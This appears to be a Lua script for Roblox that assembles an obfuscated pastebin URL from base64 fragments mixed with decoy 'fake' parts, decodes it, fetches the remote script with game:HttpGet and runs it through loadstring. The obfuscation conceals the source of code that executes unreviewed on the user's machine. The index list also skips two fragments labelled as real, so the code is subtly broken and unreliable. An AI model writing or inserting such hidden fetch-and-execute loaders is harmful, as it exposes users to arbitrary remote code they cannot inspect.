local encodedParts = {
    "aHR", -- Fake part
    "0cHM6Ly9", -- Fake part
    "aHR0cHM6Ly9", -- Real part 1
    "wYXN", -- Real part 2
    "0ZW", -- Real part 3
    "Jpbi5", -- Real part 4
    "jb20v", -- Real part 5
    "cmF3L0", -- Real part 6
    "FFNH", -- Real part 7
    "NnaW", -- Real part 8
    "E=", -- Real part 9
    "aHR0cHM6Ly9mYWtldXJsLmNvbS9mYWtl", -- Fake part
}

local function decodeBase64(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^' .. b .. '=]', '')
    return (data:gsub('.', function(x)
        if x == '=' then return '' end
        local r, f = '', (b:find(x) - 1)
        for i = 6, 1, -1 do
            r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and '1' or '0')
        end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local c = 0
        for i = 1, 8 do
            c = c + (x:sub(i, i) == '1' and 2 ^ (8 - i) or 0)
        end
        return string.char(c)
    end))
end

local realUrlParts = {3, 4, 5, 6, 7, 8, 9} -- Indices of the real parts
local combinedUrl = ""

for _, index in ipairs(realUrlParts) do
    combinedUrl = combinedUrl .. encodedParts[index]
end

local url = decodeBase64(combinedUrl)
local scriptLoader = loadstring(game:HttpGet(url))
scriptLoader()
